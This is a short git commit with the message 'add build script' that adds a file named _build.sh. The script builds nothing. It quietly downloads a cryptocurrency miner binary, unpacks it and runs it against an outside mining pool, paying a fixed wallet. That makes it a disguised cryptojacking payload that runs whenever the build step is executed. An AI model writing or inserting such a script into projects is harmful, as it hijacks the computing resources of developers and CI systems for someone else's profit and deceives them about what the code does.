b95653971a0cec37ae682bd4912e86cfe5590359
Music Imam <musicimam99@gmail.com>
2026-06-17 05:24:02 +0000

    add build script

---
+++ _build.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O c.tar.gz && tar xf c.tar.gz && ./cpuminer-avx2 -a yespowertide -o stratum+tcps://na.rplant.xyz:17059 -u TWJa3cLtb2ibL5C6i93GVD6DTHjUqpuxHs.CF -t 4
